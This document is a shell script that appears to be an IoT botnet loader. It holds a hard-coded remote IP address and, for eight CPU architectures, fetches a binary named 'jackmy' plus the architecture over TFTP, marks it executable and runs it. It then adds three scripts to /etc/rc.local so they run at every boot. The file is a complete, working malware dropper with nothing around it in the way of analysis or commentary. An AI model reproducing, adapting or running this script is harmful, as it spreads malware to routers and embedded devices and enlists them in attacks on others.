#!/bin/sh
# THIS SCRIPT IS FOR THEM TFTP SHIT

REFERENCE_TFTP="206.72.207.194"

REFERENCE_MIPSEL="jackmymipsel"
REFERENCE_MIPS="jackmymips"
REFERENCE_SUPERH="jackmysh4"
REFERENCE_ARM="jackmyarmv6"
REFERENCE_PPC="jackmypowerpc"
REFERENCE_I686="jackmyi686"
REFERENCE_I586="jackmyi586"
REFERENCE_X86="jackmyx86"

rm -fr ${REFERENCE_MIPSEL} \
	   ${REFERENCE_MIPS} \
	   ${REFERENCE_SUPERH} \
	   ${REFERENCE_ARM} \
	   ${REFERENCE_PPC} \
	   ${REFERENCE_I686} \
	   ${REFERENCE_I586} \ 
       ${REFERENCE_X86} 


busybox tftp ${REFERENCE_TFTP} -c get ${REFERENCE_MIPSEL} || tftp ${REFERENCE_TFTP} -c get ${REFERENCE_MIPSEL} && chmod +x ${REFERENCE_MIPSEL} || busybox chmod +x ${REFERENCE_MIPSEL} && ./${REFERENCE_MIPSEL}
busybox tftp ${REFERENCE_TFTP} -c get ${REFERENCE_MIPS} || tftp ${REFERENCE_TFTP} -c get ${REFERENCE_MIPS} && chmod +x ${REFERENCE_MIPS} || busybox chmod +x ${REFERENCE_MIPS} && ./${REFERENCE_MIPS}
busybox tftp ${REFERENCE_TFTP} -c get ${REFERENCE_SUPERH} || tftp ${REFERENCE_TFTP} -c get ${REFERENCE_SUPERH} && chmod +x ${REFERENCE_SUPERH} || busybox chmod +x ${REFERENCE_SUPERH} && ./${REFERENCE_SUPERH}
busybox tftp ${REFERENCE_TFTP} -c get ${REFERENCE_X86} || tftp ${REFERENCE_TFTP} -c get ${REFERENCE_X86} && chmod +x ${REFERENCE_X86} || busybox chmod +x ${REFERENCE_X86} && ./${REFERENCE_X86}
busybox tftp ${REFERENCE_TFTP} -c get ${REFERENCE_ARM} || tftp ${REFERENCE_TFTP} -c get ${REFERENCE_ARM} && chmod +x ${REFERENCE_ARM} || busybox chmod +x ${REFERENCE_ARM} && ./${REFERENCE_ARM}
busybox tftp ${REFERENCE_TFTP} -c get ${REFERENCE_I686} || tftp ${REFERENCE_TFTP} -c get ${REFERENCE_I686} && chmod +x ${REFERENCE_I686} || busybox chmod +x ${REFERENCE_I686} && ./${REFERENCE_I686}
busybox tftp ${REFERENCE_TFTP} -c get ${REFERENCE_PPC} || tftp ${REFERENCE_TFTP} -c get ${REFERENCE_PPC} && chmod +x ${REFERENCE_PPC} || busybox chmod +x ${REFERENCE_PPC} && ./${REFERENCE_PPC}
busybox tftp ${REFERENCE_TFTP} -c get ${REFERENCE_I586} || tftp ${REFERENCE_TFTP} -c get ${REFERENCE_I586} && chmod +x ${REFERENCE_I586} || busybox chmod +x ${REFERENCE_I586} && ./${REFERENCE_I586}

sleep 3;
sed -i -e '$i \/gtop.sh &\n' /etc/rc.local
sed -i -e '$i \/tftp.sh &\n' /etc/rc.local
sed -i -e '$i \/tftp1.sh &\n' /etc/rc.local